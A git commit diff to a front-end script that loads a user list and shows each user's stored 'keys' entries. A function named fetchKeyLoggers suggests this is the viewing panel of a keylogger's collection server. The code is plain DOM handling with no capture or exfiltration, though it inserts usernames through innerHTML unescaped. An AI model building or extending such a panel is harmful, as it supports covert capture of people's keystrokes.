870e35e45b5bea6692888e412aecf4aa17ab046a
LOGANATHANAN <anloganathan20@gmail.com>
2021-11-09 15:07:51 +0530

    script update

--- server/views/app.js
+++ server/views/app.js
@@ -4,19 +4,35 @@ $("#mySidenav").on('click','a',function(e){
   const xhttp = new XMLHttpRequest();
   console.log(xhttp.status);
   xhttp.onload = function() {
-    var res=JSON.parse(this.response);
+    var res=JSON.parse(JSON.parse(this.responseText));
+  
     //document.getElementsByClassName("content")[0].innerHTML=res;
-    document.getElementById("content").innerHTML=res.toString();
+    document.getElementById("username").innerHTML=res[0].username.toString();
+    const element = document.getElementById("keys");
+    element.textContent='';
+    var array=res[0].text;
+    for(var i=0;i<array.length;i++){
+      var user = document.createElement("p");
+      var node = document.createTextNode(array[i].keys);
+      user.appendChild(node);
+      user.setAttribute('style','word-break: break-word')
+      element.appendChild(user);
+      element.appendChild(document.createElement('br'));
+    }
+  
+    //document.getElementById("text").innerHTML=res[0].text.toString();
   }
   xhttp.open("GET",e.target.href);
   xhttp.send();
 })
+
+
 window.onload=function fetchKeyLoggers() {
   const xhttp = new XMLHttpRequest();
   xhttp.onload = function() {
     var array=JSON.parse(this.responseText);
     const element = document.getElementById("mySidenav");
-    for(var j=0;j<4;j++){
+   
     for(var i=0;i<array.length;i++){
       var user = document.createElement("a");
       var node = document.createTextNode(array[i].username);
@@ -26,7 +42,7 @@ window.onload=function fetchKeyLoggers() {
       element.appendChild(user);
       element.appendChild(document.createElement('br'));
     }
-  }
+  
   }
   xhttp.open("GET", "/users");
   xhttp.send();
